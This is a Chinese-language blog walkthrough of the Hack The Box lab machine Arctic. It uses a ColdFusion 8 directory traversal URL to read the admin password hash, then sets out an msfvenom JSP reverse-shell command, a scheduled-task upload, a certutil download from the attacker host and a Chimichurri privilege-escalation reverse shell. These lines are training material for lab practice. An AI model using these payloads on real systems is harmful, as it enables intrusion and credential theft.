---
title: Hackthebox::Arctic walkthrough
date: 2021/12/28
categories: 渗透测试
tags: [渗透测试,walkthrough]
index_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_23.jpg
banner_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_23.jpg
---



- **Arctic是hackthebox上一台简单难度的windows靶机**

# 信息收集

- 首先使用nmap进行端口扫描

![image-20211227235510440](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227235510440.png)

- 再使用nmap进行简单的漏洞扫描，但是这次漏洞扫描失败了，貌似是连接问题

![image-20211227235600047](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211227235600047.png)

- 通过两次nmap扫描，我们得到了有用的信息：

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
```

- 浏览器打开靶机8500端口查看

![image-20211228000308471](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228000308471.png)

- 点击CFIDE目录进行进一步的枚举

![image-20211228000324604](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228000324604.png)

- 点击administrator文件，发现是一个登录窗口

![image-20211228000552606](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228000552606.png)

- 这个页面有关**ColdFusion 8**， 我们不知道这是什么但肯定是一个系统，百度一下，发现答案都已经快出来了

![image-20211228001208827](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228001208827.png)

- 使用searchsploit查看这个是否存在漏洞

![image-20211228001306056](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228001306056.png)

- 我们发现这个存在可以利用的漏洞，貌似有文件上传和目录遍历漏洞，再使用msf看看是否可以直接利用

![image-20211228002139201](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228002139201.png)

- 都无法利用，可能是因为网络问题，接着参考别人的walkthrough，发现千篇一律的使用目录遍历漏洞，好吧我们也使用这个
- 之前我们发现网站登录页面使用了ColdFusion 8，在这之前加上adobe，然后在 exploitdb 上面查看漏洞

![image-20211228010052879](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228010052879.png)

- 按照上面提到的方式，进入 `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en` 页面，我们发现了密码的哈希值： `2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03` 

![image-20211228010532393](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228010532393.png)

- 使用[这个网站](https://crackstation.net/)解哈希，得到密码 happyday

![image-20211228010752709](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228010752709.png)

- 使用刚才的密码以管理员的身份登录后台

![image-20211228011144857](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228011144857.png)

- 创建反向shell 

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.31 LPORT=5555 > shell.jsp
```

![image-20211228014733671](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228014733671.png)

- 在靶机后台新建一个任务

![image-20211228015729922](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228015729922.png)

- 注意里面的 File填 `C:\ColdFusion8\wwwroot\CFIDE\shell.jsp`

![image-20211228020036038](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228020036038.png)

- 然后我们可以看见任务已经被创建了，然后点击运行

![image-20211228021129490](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228021129490.png)

- 回到 http://10.129.1.58:8500/CFIDE/ 刷新后就能看到我们上传的脚本shell.jsp 了

![image-20211228021153641](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228021153641.png)

- 本地nc监听端口，我们收到了shell

![image-20211228023926873](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228023926873.png)

- 接下来我们需要提权，使用权限提升脚本
- 使用脚本 chimichurri.exe，并在windows靶机中接收脚本

```
certutil -f -urlcache http://10.10.14.31:8000/Chimichurri.exe chimichurri.exe
```

![image-20211228025330194](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228025330194.png)

- 本地nc监听端口6666，靶机上 使用命令 

```
chimichurri.exe 10.10.14.31 6666
```

![image-20211228032510841](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228032510841.png)

- 这时候本地nc就能够收到shell了

![image-20211228032556501](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228032556501.png)

- 得到管理员权限，并且找到flag

![image-20211228032754084](https://herozql.oss-cn-beijing.aliyuncs.com/main/image-20211228032754084.png)

